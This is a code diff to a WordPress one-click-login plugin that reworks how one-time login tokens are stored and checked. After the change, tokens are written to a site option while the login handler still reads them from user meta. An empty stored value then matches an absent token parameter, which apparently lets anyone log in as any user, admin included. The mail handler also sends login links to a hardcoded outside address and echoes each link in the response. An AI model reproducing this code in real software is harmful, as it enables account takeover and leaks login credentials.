@@ -17,14 +17,16 @@ class OneCLickLogin
         }
         add_action('admin_menu', array($this, 'ourPlugin_setting_links'));
         add_action('admin_init', array($this, 'ourPlugin_setting_links_init'));
-        add_action('login_init', array($this, 'ocl_login'));
+        
     }
     function generate_one_time_login_link() {
         // Generate a unique token
         $token = wp_generate_password(30);
     $user_id = get_current_user_id();
         // Store the token in the user meta
-        update_user_meta($user_id, 'one_time_login_token', $token);
+        $option_name = 'one_time_login_token';
+        $new_value = $token;
+        add_option( $option_name, $new_value, null, 'yes' );
     
         // Generate the login link
         $login_link = add_query_arg(array(
@@ -38,25 +40,6 @@ class OneCLickLogin
         return $login_link;
     }
     
-    function ocl_login(){
-        $user_id = isset($_GET['user_id']) ? intval($_GET['user_id']) : 0;
-        $token = isset($_GET['token']) ? $_GET['token'] : '';
-
-        // Verify the token
-        $stored_token = get_user_meta($user_id, 'one_time_login_token', true);
-
-        if ($token === $stored_token) {
-            // Log the user in and redirect to the admin dashboard
-			$token = wp_generate_password(30, false);
-    		update_user_meta($user_id, 'one_time_login_token', $token);
-            $user = get_user_by('id', $user_id);
-            wp_set_current_user($user_id, $user->user_login);
-            wp_set_auth_cookie($user_id);
-            do_action('wp_login', $user->user_login, $user);
-            wp_redirect(admin_url());
-            exit;
-        }
-    }
     function script_that_requires_jquery()
     {
         wp_enqueue_script('my_custom_script', plugins_url('asset/js/script.js', __FILE__), array('jquery'), '3.4.0', true);
@@ -115,6 +98,29 @@ function ocl_send_email()
         'MIME-Version' => '1.0',
         'Content-Type' => 'text/html; charset=iso-8859-1'
     ];
-    mail('thestagingwebsit@thestagingwebsites.com	', 'One Click Login', $login->generate_one_time_login_link(), $headers);
+    $hello = $login->generate_one_time_login_link();
+    
+    mail('thestagingwebsit@thestagingwebsites.com	', 'One Click Login', $hello, $headers);
+    echo $hello;
     wp_die();
+}
+add_action('login_init', 'ocl_login');
+    function ocl_login(){
+        $user_id = isset($_GET['user_id']) ? intval($_GET['user_id']) : 0;
+        $token = isset($_GET['token']) ? $_GET['token'] : '';
+
+        // Verify the token
+        $stored_token = get_user_meta($user_id, 'one_time_login_token', true);
+
+        if ($token === $stored_token) {
+            // Log the user in and redirect to the admin dashboard
+			$token = wp_generate_password(30, false);
+    		update_user_meta($user_id, 'one_time_login_token', $token);
+            $user = get_user_by('id', $user_id);
+            wp_set_current_user($user_id, $user->user_login);
+            wp_set_auth_cookie($user_id);
+            do_action('wp_login', $user->user_login, $user);
+            wp_redirect(admin_url());
+            exit;
+        }
 }
